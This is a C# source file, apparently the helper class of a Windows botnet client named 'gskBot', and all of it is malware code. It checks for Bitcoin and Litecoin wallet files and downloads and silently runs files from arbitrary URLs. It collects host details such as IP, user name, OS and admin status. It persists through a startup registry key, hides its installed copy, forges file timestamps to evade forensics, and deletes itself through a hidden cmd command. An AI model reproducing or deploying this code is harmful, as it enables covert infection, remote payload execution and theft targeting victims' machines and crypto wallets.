#region Imports
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
#endregion

namespace gskBot {
    class Function {
        #region Check Network
        public static bool CheckNetwork() {
            return System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
        }
        #endregion

        #region CryptoCurrency Check
        public static bool CheckBTC() {
            if (File.Exists(Config.AppData + @"\Bitcoin\wallet.dat")) return true;
            else return false;
        }

        public static bool CheckLTC() {
            if (File.Exists(Config.AppData + @"\Litecoin\wallet.dat")) return true;
            else return false;
        }
        #endregion

        #region Download & Execute
        public static void Download(string URL) {
            string TempFile = Path.GetTempPath() + Function.RandomStr(6) + Path.GetExtension(URL);
            using (WebClient WC = new WebClient()) WC.DownloadFile(URL, TempFile);
            using (Process DropProcesss = new Process()) {
                DropProcesss.StartInfo.FileName       = TempFile;
                DropProcesss.StartInfo.WindowStyle    = ProcessWindowStyle.Hidden;
                DropProcesss.StartInfo.CreateNoWindow = true;
                DropProcesss.Start();
            }
        }
        #endregion

        #region Get Admin
        public static bool GetAdmin() {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
        #endregion

        #region Get Age
        public static string GetAge() {
            DateTime CreationTime = File.GetCreationTime(Config.SelfPath);
            if (DateTime.Now.Subtract(CreationTime).TotalHours < 1) return " [NEW]";
            else return "";
        }
        #endregion

        #region Get Computer Name
        public static string GetComputerName() {
            return Environment.MachineName;
        }
        #endregion

        #region Get Country Code
        public static string GetCountryCode() {
            return System.Globalization.RegionInfo.CurrentRegion.TwoLetterISORegionName;
        }
        #endregion

        #region Get IP Address
        public static string GetIP() {
            try {
                string externalIP;
                externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")).Matches(externalIP)[0].ToString();
                return externalIP;
            } catch {
                return "Unknown IP";
            }
        }
        #endregion

        #region Get Machine Type
        public static string GetMachineType() {
            if (Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86")) return "32";
            else return "64";
        }
        #endregion

        #region Get Operating System
        public static string GetOS() {
            int Major = Environment.OSVersion.Version.Major;
            int Minor = Environment.OSVersion.Version.Minor;
            if (Environment.OSVersion.Platform == PlatformID.Win32Windows) {
                if      (Minor == 0)              return "W95";
                else if (Minor == 10)             return "W98";
                else if (Minor == 90)             return "WME";
                else                              return "W?";
            } else if (Environment.OSVersion.Platform == PlatformID.Win32NT) {
                if      (Major == 5 & Minor == 0) return "WS2K";
                else if (Major == 5 & Minor == 1) return "WXP";
                else if (Major == 5 & Minor == 2) return "WS2K3";
                else if (Major == 6 & Minor == 0) return "WV";
                else if (Major == 6 & Minor == 1) return "W7";
                else if (Major == 6 & Minor == 2) return "W8";
                else if (Major == 6 & Minor == 3) return "W81";
                else if (Major == 10)             return "W10";
                else                              return "W?";
            } else                                return "W?";
        }
        #endregion

        #region Get File Size
        public static string GetFileSize(string URL) {
            WebRequest RequestURL = HttpWebRequest.Create(URL);
            RequestURL.Method     = "HEAD";
            WebResponse resp      = RequestURL.GetResponse();
            long ContentLength    = 0;
            long FileSizeConverted;
            if (long.TryParse(resp.Headers.Get("Content-Length"), out ContentLength)) {
                string FileSize;
                string FileSizeExt;
                if (ContentLength >= 1073741824) {
                    FileSizeConverted = ContentLength / 1073741824;
                    FileSizeExt       = "Gb";
                } else if (ContentLength >= 1048576) {
                    FileSizeConverted = ContentLength / 1048576;
                    FileSizeExt       = "Mb";
                } else {
                    FileSizeConverted = ContentLength / 1024;
                    FileSizeExt       = "Kb";
                }
                FileSize = FileSizeConverted.ToString("0");
                return FileSize + " " + FileSizeExt;
            } else {
                return "Unknown Size";
            }
        }
        #endregion

        #region Get Username
        public static string GetUsername() {
            return Environment.UserName;
        }
        #endregion

        #region Hash Encoding
        public static string Base64Encode(string plainText) {
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);
        }

        public static string Base64Decode(string base64EncodedData) {
            var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
            return Encoding.UTF8.GetString(base64EncodedBytes);
        }

        public static string MD5File(string FileName) {
            using (var md5 = MD5.Create()) {
                using (var stream = File.OpenRead(FileName)) {
                    return BitConverter.ToString(md5.ComputeHash(stream)).Replace("-", string.Empty);
                }
            }
        }
        #endregion

        #region Persistence
        public static void Persistence() {
            RegistryKey HKCU = Registry.CurrentUser.OpenSubKey(Config.StartupKeyDir, true);
            while (Config.Persistance) {
                HKCU.SetValue(Config.StartupKeyName, Config.InstallFile);
                Thread.Sleep(5000);
            }
        }
        #endregion

        #region Random Integer / String
        public static int RandomInt(int min, int max) {
            Random RandomObject = new Random();
            return RandomObject.Next(min, max);
        }

        public static string RandomStr(int size) {
            Random RandomObject = new Random();
            string CharList     = "abcdefghijklmnpqrstuvwxyz23456789";
            char[] buffer       = new char[size];
            for (int i = 0; i < size; i++) buffer[i] = CharList[RandomObject.Next(CharList.Length)];
            return new string(buffer);
        }
        #endregion

        #region Install / Uninstall
        public static void Install() {
            if (Config.SelfPath == Config.InstallFile) new Thread(Persistence).Start();
            else {
                if (!File.Exists(Config.InstallFile)) {
                    if (!Directory.Exists(Config.InstallFile)) Directory.CreateDirectory(Path.GetDirectoryName(Config.InstallFile));
                    Directory.SetCreationTime(Config.SelfPath, new DateTime(RandomInt(2008, 2013), RandomInt(1, 12), RandomInt(1, 28), RandomInt(0, 23), RandomInt(0, 59), RandomInt(0, 59)));
                    Directory.SetLastAccessTime(Config.SelfPath, new DateTime(RandomInt(2008, 2013), RandomInt(1, 12), RandomInt(1, 28), RandomInt(0, 23), RandomInt(0, 59), RandomInt(0, 59)));
                    Directory.SetLastWriteTime(Config.SelfPath, new DateTime(RandomInt(2008, 2013), RandomInt(1, 12), RandomInt(1, 28), RandomInt(0, 23), RandomInt(0, 59), RandomInt(0, 59)));
                    File.Copy(Config.SelfPath, Config.InstallFile, true);
                    File.SetCreationTime(Config.SelfPath, new DateTime(RandomInt(2008, 2013), RandomInt(1, 12), RandomInt(1, 28), RandomInt(0, 23), RandomInt(0, 59), RandomInt(0, 59)));
                    File.SetLastAccessTime(Config.SelfPath, new DateTime(RandomInt(2008, 2013), RandomInt(1, 12), RandomInt(1, 28), RandomInt(0, 23), RandomInt(0, 59), RandomInt(0, 59)));
                    File.SetLastWriteTime(Config.SelfPath, new DateTime(RandomInt(2008, 2013), RandomInt(1, 12), RandomInt(1, 28), RandomInt(0, 23), RandomInt(0, 59), RandomInt(0, 59)));
                    File.SetAttributes(Config.InstallFile, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly | FileAttributes.NotContentIndexed);
                    Process.Start(Config.InstallFile);
                    Environment.Exit(0);
                } else Environment.Exit(0);
            }
        }

        public static void Uninstall() {
            Config.Persistance = false;
            try {
                RegistryKey HKCU = Registry.CurrentUser.OpenSubKey(Config.StartupKeyDir, true);
                HKCU.DeleteValue(Config.StartupKeyName);
                File.SetAttributes(Config.SelfPath, FileAttributes.Normal);
                ProcessStartInfo MeltProcess = new ProcessStartInfo();
                MeltProcess.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Config.SelfPath;
                MeltProcess.WindowStyle = ProcessWindowStyle.Hidden;
                MeltProcess.CreateNoWindow = true;
                MeltProcess.FileName = "cmd.exe";
                Process.Start(MeltProcess);
                Environment.Exit(0);
            } catch {
                Environment.Exit(0);
            }
        }
        #endregion
    }
}